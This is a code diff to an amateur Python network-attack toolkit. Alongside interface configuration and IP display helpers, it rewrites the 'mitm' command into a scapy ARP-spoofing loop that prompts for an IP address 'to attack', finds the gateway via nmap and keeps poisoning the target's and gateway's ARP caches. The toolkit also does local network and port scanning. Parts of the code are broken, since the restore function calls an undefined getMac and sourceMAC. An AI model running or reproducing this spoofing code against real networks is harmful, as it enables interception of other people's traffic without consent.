@@ -6,6 +6,9 @@ import sys
 from bs4 import BeautifulSoup as bs
 import requests as rq
 import netifaces as ni
+import argparse
+import time
+import scapy.all as scapy
 
 
 if platform == "linux" or platform == "linux2":
@@ -21,6 +24,8 @@ def help():
     print("     ", colored(0, 255, 0, commands[0]), "makes you exit.")
     print("     ",colored(0, 255, 0, commands[3]), "clear the screen")
     print("     ",colored(0, 255, 0, commands[2]), "prompt the help menu")
+    print("     ",colored(0, 255, 0, commands[8]), "show iformation obout your ip configuration depending on your os")
+    print("     ",colored(0, 255, 0, commands[9]), "let's you configure your iface (wifi or ethernet, here called wlan or eth)")
     print("\n")
     print("     ",colored(0, 255, 0, commands[1]), "show the alive devices on your local network")
     print("     ",colored(0, 255, 0, commands[4]), "check open ports on the alive devices of your local network")
@@ -29,6 +34,36 @@ def help():
     print("     ",colored(0, 255, 0, commands[6]), "looks for a username in various websites")
 
 
+def conf():
+    iface = str(input("what interface do you want to use? : "))
+
+    if iface == "eth":
+        try:
+            ni.ifaddresses('eth0')
+            local_ip = str(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
+        except ValueError:
+            try:
+                ni.ifaddresses('eth1')
+                local_ip = str(ni.ifaddresses('eth1')[ni.AF_INET][0]['addr'])
+            except ValueError:
+                print("")
+                print("     no ethernet connexion detedted")
+
+    if iface == "wlan":
+        try:
+            ni.ifaddresses('wlan0')
+            local_ip = str(ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr'])
+        except KeyError:
+            try:
+                ni.ifaddresses('wlan1')
+                local_ip = str(ni.ifaddresses('wlan1')[ni.AF_INET][0]['addr'])
+            except ValueError:
+                print("")
+                print("     no wifi connexion detedted")
+    try:
+        print("you are now using", colored(0, 255, 0, local_ip))
+    except UnboundLocalError:
+        None
 
 def scan():
     nm = nmap.PortScanner()
@@ -72,22 +107,23 @@ def scan_firewall():
             print("")
 
 def mitm():
-    w = ""
-    e = ""
-    if platform == "linux" or platform == "linux2":
-        for i in (local_ip, -1):
-            if i != ".":
-                w = w + str(i)
-            else:
-                for c in (w, -i):
-                    e = e + str(c)
-        root = local_ip - e
-        v = str(input("what device do you want to attacks ?"))
-        victime = root + v
-        os.system("ettercap -T -S -M arp:remote /{1}// /{2}//".format(root + "1", victime))
-    if platform == "win32":
-        print("")
-        print("you must be on linux and have ettercap installed")
+    print("")
+    target_ip = str(input(colored(0, 255, 0, "     chose an IP address to attack : ")))
+    target = target_ip + "/24"
+    nm = nmap.PortScanner()
+    scan = nm.scan(hosts= target , arguments='-sn -Pn')
+    for i in scan['scan']:
+        brand = list(scan['scan'][i]['vendor'].values())
+        name = scan['scan'][i]['hostnames'][0]['name']
+        if name == "lan.home":
+            spoof_ip = i[:-1]
+    scan = nm.scan(hosts = target, arguments='-sn')
+    for i in scan['scan']:
+        if i == target_ip:
+            destinationMac = scan['scan'][i]['addresses']['mac']
+    
+    start(target_ip, spoof_ip, destinationMac)
+
 
 def search():
     user = str(input("username :"))
@@ -97,7 +133,38 @@ def search():
         title = soup.find_all('title')
         print(title)
 
+def ip():
+    print("")
+    if platform == "linux" or platform == "linux2":
+        os.system("ip addr")
+    if platform == "win32":
+        os.system("ipconfig")
+    print("")
+    print("you are currently known as", colored(0, 255, 0, local_ip))
 
+def spoofer(targetIP, spoofIP, destinationMac):
+    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
+    scapy.send(packet, verbose=False)
+    print(packet)
+
+def restore(destinationIP, sourceIP, destinationMac):
+    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=sourceMAC)
+    scapy.send(packet, count=4,verbose=False)
+
+def start(targetIP, gatewayIP, destinationMac):
+    packets = 0
+    try:
+        while True:
+            spoofer(targetIP,gatewayIP, destinationMac)
+            spoofer(gatewayIP,targetIP, destinationMac)
+            print("\r[+] Sent packets "+ str(packets)),
+            sys.stdout.flush()
+            packets +=2
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
+        restore(targetIP,gatewayIP, destinationMac)
+        restore(gatewayIP,targetIP, destinationMac)
 
 def main():
     run = True
@@ -123,6 +190,10 @@ def main():
                     os.system("cls")
             if cmd == "help":
                 help()
+            if cmd == "ip":
+                ip()
+            if cmd == "config":
+                conf()
 
             if cmd == "scan":
                 scan()
@@ -183,6 +254,8 @@ except ValueError:
 
 url = ["https://www.twitter.com/", "https://www.instagram.com/"]
 
-commands = ["exit", "scan", "help", "clear", "scan firewall", "mitm", "search", "scan all"]
+commands = ["exit", "scan", "help", "clear", "scan firewall", "mitm", "search", "scan all", "ip", "config"]
 
 main()
+
+
